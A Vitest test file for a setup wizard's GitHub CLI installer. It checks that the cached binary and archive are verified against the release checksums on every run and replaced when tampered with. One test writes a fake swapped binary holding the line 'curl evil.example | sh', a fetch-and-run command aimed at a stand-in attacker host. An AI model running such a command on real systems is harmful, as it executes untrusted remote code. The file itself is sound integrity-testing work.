import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * What the cached `gh` is worth on the second run.
 *
 * The archive lands in a per-user cache directory, and a cache directory is a
 * path that anything else running as this user can write — including whatever
 * arrived through the browser an hour ago. The wizard then hands that binary a
 * GitHub token and lets it create repositories. So "the file is already there"
 * is not an answer to "is this the binary the GitHub CLI team published"; only
 * a digest is, and it has to be taken every time, not once at download.
 *
 * The network is scripted and the archive is real: `tar` unpacks it the way it
 * would unpack the published one, so the extraction path is exercised rather
 * than described.
 */
let served: (url: string) => Promise<unknown>;

/* Only the socket is scripted. `readBytesCapped` is the real one, so the cap
   and the stall timer are exercised by every download this file drives. */
vi.mock('../src/net', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../src/net')>()),
  outboundFetch: (url: string) => served(url),
}));

const { ghAssetFor, ghChecksumsUrl, ghDownloadUrl, installGhFromRelease } = await import('../src/github/release');

const VERSION = '2.98.0';
const asset = ghAssetFor(process.platform, process.arch, VERSION);
/* The zip assets need a zip writer to fake, and Windows has no XDG_CACHE_HOME
   to point somewhere harmless. Where the published asset is a tarball, `tar`
   builds one. */
const runnable = asset?.kind === 'tar.gz' && process.platform !== 'win32';

const BINARY = '#!/bin/sh\necho the-real-gh\n';

let cache: string;
let archive: Buffer;
let downloads: string[];
const savedCacheHome = process.env.XDG_CACHE_HOME;

function buildArchive(): Buffer {
  const staging = mkdtempSync(join(tmpdir(), 'gh-archive-'));
  try {
    mkdirSync(join(staging, 'gh_2.98.0', 'bin'), { recursive: true });
    const binary = join(staging, 'gh_2.98.0', 'bin', 'gh');
    writeFileSync(binary, BINARY);
    chmodSync(binary, 0o755);
    const out = join(staging, 'out.tar.gz');
    execFileSync('tar', ['-czf', out, '-C', staging, 'gh_2.98.0']);
    return readFileSync(out);
  } finally {
    rmSync(staging, { recursive: true, force: true });
  }
}

const sha256 = (bytes: Buffer): string => createHash('sha256').update(bytes).digest('hex');

/**
 * Enough of a Response for what release.ts asks of one.
 *
 * The headers are empty rather than absent: `readBytesCapped` asks for
 * `content-length` before it reads anything, and a stub without them would
 * fail on the shape instead of on what the test is about. No body stream, so
 * the capped read takes the whole-buffer path - which is the one a mock like
 * this exercises anyway.
 */
const answer = (body: Buffer | object): unknown =>
  Buffer.isBuffer(body)
    ? { ok: true, status: 200, headers: new Headers(), arrayBuffer: async () => body }
    : { ok: true, status: 200, headers: new Headers(), json: async () => body };

beforeEach(() => {
  cache = mkdtempSync(join(tmpdir(), 'gh-cache-'));
  process.env.XDG_CACHE_HOME = cache;
  archive = runnable ? buildArchive() : Buffer.alloc(0);
  downloads = [];
  const checksums = Buffer.from(`${sha256(archive)}  ${asset?.name ?? 'none'}\n`);
  served = async (url: string) => {
    downloads.push(url);
    if (url.includes('/releases/latest')) return answer({ tag_name: `v${VERSION}` });
    if (url === ghChecksumsUrl(VERSION)) return answer(checksums);
    if (asset && url === ghDownloadUrl(VERSION, asset)) return answer(archive);
    throw new Error(`unscripted request: ${url}`);
  };
});

afterEach(() => {
  rmSync(cache, { recursive: true, force: true });
  if (savedCacheHome === undefined) delete process.env.XDG_CACHE_HOME;
  else process.env.XDG_CACHE_HOME = savedCacheHome;
});

const archiveRequests = (): number => downloads.filter((url) => url.includes(asset?.name ?? '@')).length;

describe.runIf(runnable)('the cached gh binary', () => {
  it('downloads it once and leaves it runnable', async () => {
    const path = (await installGhFromRelease())!;
    expect(readFileSync(path, 'utf8')).toBe(BINARY);
    expect(archiveRequests()).toBe(1);
  });

  /* The whole reason the digest is re-taken: a cached path that is merely
     present proves nothing, and this is the binary the wizard is about to hand
     a GitHub token to. */
  it('replaces a cached binary that somebody swapped', async () => {
    const path = (await installGhFromRelease())!;
    writeFileSync(path, '#!/bin/sh\ncurl evil.example | sh\n');

    expect(readFileSync((await installGhFromRelease())!, 'utf8')).toBe(BINARY);
    // The archive still matched, so nothing had to come over the network again.
    expect(archiveRequests()).toBe(1);
  });

  it('re-downloads when the cached archive is no longer what the release publishes', async () => {
    await installGhFromRelease();
    const cachedArchive = join(cache, 'chatfuel-wizard', 'gh', VERSION, asset!.name);
    writeFileSync(cachedArchive, 'not the published archive');

    expect(readFileSync((await installGhFromRelease())!, 'utf8')).toBe(BINARY);
    expect(archiveRequests()).toBe(2);
  });

  it('takes the digest from the release on every run, not from the cache', async () => {
    await installGhFromRelease();
    expect(downloads.filter((url) => url === ghChecksumsUrl(VERSION))).toHaveLength(1);
    await installGhFromRelease();
    expect(downloads.filter((url) => url === ghChecksumsUrl(VERSION))).toHaveLength(2);
  });

  it('refuses when the checksums file does not list the asset', async () => {
    served = async (url: string) => {
      if (url.includes('/releases/latest')) return answer({ tag_name: `v${VERSION}` });
      if (url === ghChecksumsUrl(VERSION)) return answer(Buffer.from(`${'a'.repeat(64)}  something-else.tar.gz\n`));
      throw new Error(`unscripted request: ${url}`);
    };
    await expect(installGhFromRelease()).rejects.toThrow(/checksums file does not list/);
  });
});
